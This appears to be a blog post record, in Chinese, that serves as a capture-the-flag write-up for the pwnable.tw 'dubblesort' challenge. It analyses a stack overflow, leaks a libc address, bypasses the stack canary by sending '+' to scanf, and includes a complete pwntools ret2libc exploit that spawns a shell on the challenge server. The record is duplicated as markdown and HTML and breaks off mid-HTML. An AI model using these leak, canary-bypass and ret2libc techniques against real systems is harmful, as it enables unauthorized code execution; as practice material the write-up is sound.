read(0, buf, 0x40u);\n  __printf_chk(1, \"Hello %s,How many numbers do you what to sort :\");\n  __isoc99_scanf(\"%u\", &v8);\n  v3 = v8;\n  if ( v8 )\n  {\n    v4 = v9;\n    for ( i = 0; i < v8; ++i )\n    {\n      __printf_chk(1, \"Enter the %d number : \");\n      fflush(stdout);\n      __isoc99_scanf(\"%u\", v4);\n      v3 = v8;\n      ++v4;\n    }\n  }\n  sort(v9, v3);\n  puts(\"Result :\");\n  if ( v8 )\n  {\n    for ( j = 0; j < v8; ++j )\n      __printf_chk(1, \"%u \");\n  }\n  result = 0;\n  if ( __readgsdword(0x14u) != v11 )\n    sub_BA0();\n  return result;\n}\n```\n\n对于这个反汇编的程序，可以看到漏洞点在于对于排序的个数没有限制，可以作为栈溢出的漏洞点\n\n同时，因为开了NX，RELRO，ret2shellcode无法作用，但是给了libc版本，考虑ret2libc.\n\n进一步的，通过调试，发现栈上存在libc的地址，考虑通过read和printf实现泄露\n\n## 0x3 Process\n\n1. 读入cyclic，一直覆盖到libc基址的位置，再通过__printf_chuk泄露出libc基址\n2. 读入需要排序的数字，在canary之前的数字选择较小的数字。保证排序之后canary仍然在原来的位置\n3. 在读入到cannary的位置时，送入+号，实现读入但不写入内存，就实现了对canary的绕过\n4. 在栈上布置libc中system以及/bin/sh的地址\n\n## 0x4 Some questions\n\n1. 在实际调试过程，通过pwndbg的canary命令查看发现, 在这个题目中，canary并不在靠近rbp的位置，反而在栈中间\n\n2. 一个问题，题目给的libc不是标准命名，所以我找不到对应ld，询问学长后知道了直接在libc文件中找标准命名，虽然我找到的这个版本的libc和他给的还是不一样。。。。\n\n3. 在本地打通后，远程一直打不通，在将泄露出的基址打印出来之后，发现这个地址最后的三位地址是0x244，而不是本地的0x000，在本地，这个地址是偏移为0x1b0000的地址，但是在远程，这个偏移显然改变了\n\n   解决：\n\n   - 多次连接远程，对于泄露出来的地址进行分析，发现地址其他部分都在变化，低位的0x244始终不变，符合libc地址的特征，推测远程的这个位置确实是一个libc的地址。\n   - 那么偏移到底是多少呢？这个地址大概率是一个特殊地址，直接将libc拖入IDA，搜索结尾为0x244的地址，尝试可能地址，尝试了几次后成功，为偏移在0x1AE244的一个Initialization Table的地址\n\n   思考：\n\n   - 对于这个题目，我本地和远程libc地址是相同的，但是唯一不同的只有ld版本，但是ld版本的不同也不应该改变栈中的这个地址的偏移, 所以这里的变化我还没搞明白原因。暂时码着\n     以及，我查看往年的wp，所有的都是直接0x1b0000的偏移实现getshell。是远程改了题目吗?\n\n## 0x5 exp\n\n```python\nfrom pwn import*\n\n#p = gdb.debug('./dubblesort','b main')\n#p = process('./dubblesort')\np = remote('chall.pwnable.tw',10101)\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = 'debug'\n#elf = ELF('/home/nemo/Active/CTFtools/glibc-all-in-one/libs/2.23-0ubuntu5_i386/libc-2.23.so')\nret_add = 0x177dc\n\nelf = ELF('./libc_32.so.6')\n\ndef putNum(i):\n    p.recvuntil(' : ')\n    p.sendline(str(i))\n\n\nname = cyclic(27)\n\np.recvuntil('name :')\np.sendline(name)\n\nlibc_base = u32(p.recv(32+6)[-4:])\nprint('%x' % libc_base)\nlibc_base = (((libc_base>>12)-0x1Ae)<<12)\n\nprint('%x' % libc_base)\nsystem_add = libc_base + elf.sym['system']\n\np.recvuntil('sort :')\np.sendline('36')\n\nfor i in range(24):\n    putNum(0)\n\np.recv()\np.sendline('+')\n\nfor i in range(8):\n    putNum(system_add)\nfor i in range(3):\n    putNum(libc_base+elf.search(b'/bin/sh\\0').__next__())\n\np.interactive()\n```\n\n## 0x6 New skills\n\n**PWN**\n\n1. +-号绕过canary\n2. 泄露栈上的libc地址\n3. debug对于远程的分析\n\n**Script**\n\n1. python格式化输出\n2. pwntools.elf模块搜索字符串。\n   python3的next()改名了\n","source":"_posts/Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable].md","raw":"---\ntitle: Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]\ndate: 2022-4-25\ntags: \n- Pwn\n- CTF\n\ncategories:\n- CTF\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n\n\n# Libc leak and Bypass the canary-pwnable[dobblesort]\n\n## 0x1 checksec\n\n![checksec](2022-4-25-dobblesort/图像 1.png)\n\nFull protection.\n\n## 0x2 Analysis\n\n查看这个程序，\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  int v3; // eax\n  unsigned int *v4; // edi\n  unsigned int i; // esi\n  unsigned int j; // esi\n  int result; // eax\n  unsigned int v8; // [esp+18h] [ebp-74h] BYREF\n  unsigned int v9[8]; // [esp+1Ch] [ebp-70h] BYREF\n  char buf[64]; // [esp+3Ch] [ebp-50h] BYREF\n  unsigned int v11; // [esp+7Ch] [ebp-10h]\n\n  v11 = __readgsdword(0x14u);\n  sub_8B5();\n  __printf_chk(1, \"What your name :\");\n  read(0, buf, 0x40u);\n  __printf_chk(1, \"Hello %s,How many numbers do you what to sort :\");\n  __isoc99_scanf(\"%u\", &v8);\n  v3 = v8;\n  if ( v8 )\n  {\n    v4 = v9;\n    for ( i = 0; i < v8; ++i )\n    {\n      __printf_chk(1, \"Enter the %d number : \");\n      fflush(stdout);\n      __isoc99_scanf(\"%u\", v4);\n      v3 = v8;\n      ++v4;\n    }\n  }\n  sort(v9, v3);\n  puts(\"Result :\");\n  if ( v8 )\n  {\n    for ( j = 0; j < v8; ++j )\n      __printf_chk(1, \"%u \");\n  }\n  result = 0;\n  if ( __readgsdword(0x14u) != v11 )\n    sub_BA0();\n  return result;\n}\n```\n\n对于这个反汇编的程序，可以看到漏洞点在于对于排序的个数没有限制，可以作为栈溢出的漏洞点\n\n同时，因为开了NX，RELRO，ret2shellcode无法作用，但是给了libc版本，考虑ret2libc.\n\n进一步的，通过调试，发现栈上存在libc的地址，考虑通过read和printf实现泄露\n\n## 0x3 Process\n\n1. 读入cyclic，一直覆盖到libc基址的位置，再通过__printf_chuk泄露出libc基址\n2. 读入需要排序的数字，在canary之前的数字选择较小的数字。保证排序之后canary仍然在原来的位置\n3. 在读入到cannary的位置时，送入+号，实现读入但不写入内存，就实现了对canary的绕过\n4. 在栈上布置libc中system以及/bin/sh的地址\n\n## 0x4 Some questions\n\n1. 在实际调试过程，通过pwndbg的canary命令查看发现, 在这个题目中，canary并不在靠近rbp的位置，反而在栈中间\n\n2. 一个问题，题目给的libc不是标准命名，所以我找不到对应ld，询问学长后知道了直接在libc文件中找标准命名，虽然我找到的这个版本的libc和他给的还是不一样。。。。\n\n3. 在本地打通后，远程一直打不通，在将泄露出的基址打印出来之后，发现这个地址最后的三位地址是0x244，而不是本地的0x000，在本地，这个地址是偏移为0x1b0000的地址，但是在远程，这个偏移显然改变了\n\n   解决：\n\n   - 多次连接远程，对于泄露出来的地址进行分析，发现地址其他部分都在变化，低位的0x244始终不变，符合libc地址的特征，推测远程的这个位置确实是一个libc的地址。\n   - 那么偏移到底是多少呢？这个地址大概率是一个特殊地址，直接将libc拖入IDA，搜索结尾为0x244的地址，尝试可能地址，尝试了几次后成功，为偏移在0x1AE244的一个Initialization Table的地址\n\n   思考：\n\n   - 对于这个题目，我本地和远程libc地址是相同的，但是唯一不同的只有ld版本，但是ld版本的不同也不应该改变栈中的这个地址的偏移, 所以这里的变化我还没搞明白原因。暂时码着\n     以及，我查看往年的wp，所有的都是直接0x1b0000的偏移实现getshell。是远程改了题目吗?\n\n## 0x5 exp\n\n```python\nfrom pwn import*\n\n#p = gdb.debug('./dubblesort','b main')\n#p = process('./dubblesort')\np = remote('chall.pwnable.tw',10101)\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = 'debug'\n#elf = ELF('/home/nemo/Active/CTFtools/glibc-all-in-one/libs/2.23-0ubuntu5_i386/libc-2.23.so')\nret_add = 0x177dc\n\nelf = ELF('./libc_32.so.6')\n\ndef putNum(i):\n    p.recvuntil(' : ')\n    p.sendline(str(i))\n\n\nname = cyclic(27)\n\np.recvuntil('name :')\np.sendline(name)\n\nlibc_base = u32(p.recv(32+6)[-4:])\nprint('%x' % libc_base)\nlibc_base = (((libc_base>>12)-0x1Ae)<<12)\n\nprint('%x' % libc_base)\nsystem_add = libc_base + elf.sym['system']\n\np.recvuntil('sort :')\np.sendline('36')\n\nfor i in range(24):\n    putNum(0)\n\np.recv()\np.sendline('+')\n\nfor i in range(8):\n    putNum(system_add)\nfor i in range(3):\n    putNum(libc_base+elf.search(b'/bin/sh\\0').__next__())\n\np.interactive()\n```\n\n## 0x6 New skills\n\n**PWN**\n\n1. +-号绕过canary\n2. 泄露栈上的libc地址\n3. debug对于远程的分析\n\n**Script**\n\n1. python格式化输出\n2. pwntools.elf模块搜索字符串。\n   python3的next()改名了\n","slug":"Libc-Leak-and-Bypass-the-canary-dobblesort-[pwnable]","published":1,"updated":"2022-07-12T12:04:37.400Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cl6g6maj90007j8v045soc4vw","content":"<h1 id=\"Libc-leak-and-Bypass-the-canary-pwnable-dobblesort\">Libc leak and Bypass the canary-pwnable[dobblesort]</h1>\n<h2 id=\"0x1-checksec-2\">0x1 checksec</h2>\n<p>![checksec](2022-4-25-dobblesort/图像 1.png)</p>\n<p>Full protection.</p>\n<h2 id=\"0x2-Analysis-2\">0x2 Analysis</h2>\n<p>查看这个程序，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> *v4; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> j; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v8; <span class=\"comment\">// [esp+18h] [ebp-74h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v9[<span class=\"number\">8</span>]; <span class=\"comment\">// [esp+1Ch] [ebp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">64</span>]; <span class=\"comment\">// [esp+3Ch] [ebp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v11; <span class=\"comment\">// [esp+7Ch] [ebp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v11 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  sub_8B5();</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1</span>, <span class=\"string\">&quot;What your name :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x40</span>u);</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1</span>, <span class=\"string\">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;v8);</span><br><span class=\"line\">  v3 = v8;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v8 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = v9;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v8; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      __printf_chk(<span class=\"number\">1</span>, <span class=\"string\">&quot;Enter the %d number : &quot;</span>);</span><br><span class=\"line\">      fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">      __isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, v4);</span><br><span class=\"line\">      v3 = v8;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sort(v9, v3);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Result :&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v8 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt; v8; ++j )</span><br><span class=\"line\">      __printf_chk(<span class=\"number\">1</span>, <span class=\"string\">&quot;%u &quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( __readgsdword(<span class=\"number\">0x14</span>u) != v11 )</span><br><span class=\"line\">    sub_BA0();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于这个反汇编的程序，可以看到漏洞点在于对于排序的个数没有限制，可以作为栈溢出的漏洞点</p>\n<p>同时，因为开了NX，RELRO，ret2shellcode无法作用，但是给了libc版本，考虑ret2libc.</p>\n<p>进一步的，通过调试，发现栈上存在libc的地址，考虑通过read和printf实现泄露</p>\n<h2 id=\"0x3-Process-2\">0x3 Process</h2>\n<ol>\n<li>读入cyclic，一直覆盖到libc基址的位置，再通过__printf_chuk泄露出libc基址</li>\n<li>读入需要排序的数字，在canary之前的数字选择较小的数字。保证排序之后canary仍然在原来的位置</li>\n<li>在读入到cannary的位置时，送入+号，实现读入但不写入内存，就实现了对canary的绕过</li>\n<li>在栈上布置libc中system以及/bin/sh的地址</li>\n</ol>\n<h2 id=\"0x4-Some-questions\">0x4 Some questions</h2>\n<ol>\n<li>\n<p>在实际调试过程，通过pwndbg的canary命令查看发现, 在这个题目中，canary并不在靠近rbp的位置，反而在栈中间</p>\n</li>\n<li>\n<p>一个问题，题目给的libc不是标准命名，所以我找不到对应ld，询问学长后知道了直接在libc文件中找标准命名，虽然我找到的这个版本的libc和他给的还是不一样。。。。</p>\n</li>\n<li>\n<p>在本地打通后，远程一直打不通，在将泄露出的基址打印出来之后，发现这个地址最后的三位地址是0x244，而不是本地的0x000，在本地，这个地址是偏移为0x1b0000的地址，但是在远程，这个偏移显然改变了</p>\n<p>解决：</p>\n<ul>\n<li>多次连接远程，对于泄露出来的地址进行分析，发现地址其他部分都在变化，低位的0x244始终不变，符合libc地址的特征，推测远程的这个位置确实是一个libc的地址。</li>\n<li>那么偏移到底是多少呢？这个地址大概率是一个特殊地址，直接将libc拖入IDA，搜索结尾为0x244的地址，尝试可能地址，尝试了几次后成功，为偏移在0x1AE244的一个Initialization Table的地址</li>\n</ul>\n<p>思考：</p>\n<ul>\n<li>对于这个题目，我本地和远程libc地址是相同的，但是唯一不同的只有ld版本，但是ld版本的不同也不应该改变栈中的这个地址的偏移, 所以这里的变化我还没搞明白原因。暂时码着<br>\n以及，我查看往年的wp，所有的都是直接0x1b0000的偏移实现getshell。是远程改了题目吗?</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"0x5-exp\">0x5 exp</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#p = gdb.debug(&#x27;./dubblesort&#x27;,&#x27;b main&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./dubblesort&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;chall.pwnable.tw&#x27;</span>,<span class=\"number\">10101</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#elf = ELF(&#x27;/home/nemo/Active/CTFtools/glibc-all-in-one/libs/2.23-0ubuntu5_i386/libc-2.23.so&#x27;)</span></span><br><span class=\"line\">ret_add = <span class=\"number\">0x177dc</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">putNum</span>(<span class=\"params\">i</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27; : &#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(i))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">name = cyclic(<span class=\"number\">27</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;name :&#x27;</span>)</span><br><span class=\"line\">p.sendline(name)</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = u32(p.recv(<span class=\"number\">32</span>+<span class=\"number\">6</span>)[-<span class=\"number\">4</span>:])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;%x&#x27;</span> % libc_base)</span><br><span class=\"line\">libc_base = (((libc_base&gt;&gt;<span class=\"number\">12</span>)-<span class=\"number\">0x1Ae</span>)&lt;&lt;<span class=\"number\">12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;%x&#x27;</span> % libc_base)</span><br><span class=\"line\">system_add = libc_base + elf.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&#x27;sort :&#x27;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;36&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">24</span>):</span><br><span class=\"line\">    putNum(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recv()</span><br><span class=\"line\">p.sendline(<span class=\"string\">&#x27;+&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    putNum(system_add)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">    putNum(libc_base+elf.search(<span class=\"string\">b&#x27;/bin/sh\\0&#x27;</span>).__next__())</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x6-New-skills\">0x6 New skills</h2>\n<p><strong>PWN</strong></p>\n<ol>\n<li>±号绕过canary</li>\n<li>泄露栈上的libc地址</li>\n<li>debug对于远程的分析</li>\n</ol>\n<p><strong>Script</strong></p>\n<ol>\n<li>python格式化输出</li>\n<li>pwntools.elf模块搜索字符串。<br>\npython3的next()改名了</li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Libc-leak-and-Bypass-the-canary-pwnable-dobblesort\">Libc leak and Bypass the canary-pwnable[dobblesort]</h1>\n<h2 id=\"0x1-checksec-2\">0x1 checksec</h2>\n<p>![checksec](2022-4-25-dobblesort/图像 1.png)</p>\n<p>Full protection.</p>\n<h2 id=\"0x2-Analysis-2\">0x2 Analysis</h2>\n<p>查看这个程序，</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v3; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> *v4; <span class=\"comment\">// edi</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> i; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> j; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  <span class=\"type\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v8; <span class=\"comment\">// [esp+18h] [ebp-74h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v9[<span class=\"number\">8</span>]; <span class=\"comment\">// [esp+1Ch] [ebp-70h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">64</span>]; <span class=\"comment\">// [esp+3Ch] [ebp-50h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> <span class=\"type\">int</span> v11; <span class=\"comment\">// [esp+7Ch] [ebp-10h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v11 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  sub_8B5();</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1</span>, <span class=\"string\">&quot;What your name :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x40</span>u);</span><br><span class=\"line\">  __printf_chk(<span class=\"number\">1</span>, <span class=\"string\">&quot;Hello %s,How many numbers do you what to sort :&quot;</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, &amp;v8);</span><br><span class=\"line\">  v3 = v8;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v8 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    v4 = v9;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v8; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      __printf_chk(<span class=\"number\">1</span>, <span class=\"string\">&quot;Enter the %d number : &quot;</span>);</span><br><span class=\"line\">      fflush(<span class=\"built_in\">stdout</span>);</span><br><span class=\"line\">      __isoc99_scanf(<span class=\"string\">&quot;%u&quot;</span>, v4);</span><br><span class=\"line\">      v3 = v8;</span><br><span class=\"line\">      ++v4;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sort(v9, v3);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Result :&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v8 )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt; v8; ++j )</span><br><span class=\"line\">      __printf_chk(<span class=\"number\">1</span>, <span class=\"string\">&quot;%u &quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( __readgsdword(<span class=\"number\">0x14</span>u) != v11 )</span><br><span class=\"line\">    sub_BA0();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>对于这个反汇编的程序，可以看到漏洞点在于对于排序的个数没有限制，可以作为栈溢出的漏洞点</p>\n<p>同时，因为开了NX，RELRO，ret2shellcode无法作用，但是给了libc版本，考虑ret2libc.</p>\n<p>进一步的，通过调试，发现栈上存在libc的地址，考虑通过read和printf实现泄露</p>\n<h2 id=\"0x3-Process-2\">0x3 Process</h2>\n<ol>\n<li>读入cyclic，一直覆盖到libc基址的位置，再通过__printf_chuk泄露出libc基址</li>\n<li>读入需要排序的数字，在canary之前的数字选择较小的数字。保证排序之后canary仍然在原来的位置</li>\n<li>在读入到cannary的位置时，送入+号，实现读入但不写入内存，就实现了对canary的绕过</li>\n<li>在栈上布置libc中system以及/bin/sh的地址</li>\n</ol>\n<h2 id=\"0x4-Some-questions\">0x4 Some questions</h2>\n<ol>\n<li>\n<p>在实际调试过程，通过pwndbg的canary命令查看发现, 在这个题目中，canary并不在靠近rbp的位置，反而在栈中间</p>\n</li>\n<li>\n<p>一个问题，题目给的libc不是标准命名，所以我找不到对应ld，询问学长后知道了直接在libc文件中找标准命名，虽然我找到的这个版本的libc和他给的还是不一样。。。。</p>\n</li>\n<li>\n<p>在本地打通后，远程一直打不通，在将泄露出的基址打印出来之后，发现这个地址最后的三位地址是0x244，而不是本地的0x000，在本地，这个地址是偏移为0x1b0000的地址，但是在远程，这个偏移显然改变了</p>\n<p>解决：</p>\n<ul>\n<li>多次连接远程，对于泄露出来的地址进行分析，发现地址其他部分都在变化，低位的0x244始终不变，符合libc地址的特征，推测远程的这个位置确实是一个libc的地址。</li>\n<li>那么偏移到底是多少呢？这个地址大概率是一个特殊地址，直接将libc拖入IDA，搜索结尾为0x244的地址，尝试可能地址，尝试了几次后成功，为偏移在0x1AE244的一个Initialization Table的地址</li>\n</ul>\n<p>思考：</p>\n<ul>\n<li>对于这个题目，我本地和远程libc地址是相同的，但是唯一不同的只有ld版本，但是ld版本的不同也不应该改变栈中的这个地址的偏移, 所以这里的变化我还没搞明白原因。暂时码着<br>\n以及，我查看往年的wp，所有的都是直接0x1b0000的偏移实现getshell。是远程改了题目吗?</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"0x5-exp\">0x5 exp</h2>\n<figure class=\"highlight python\"><table><tr><td 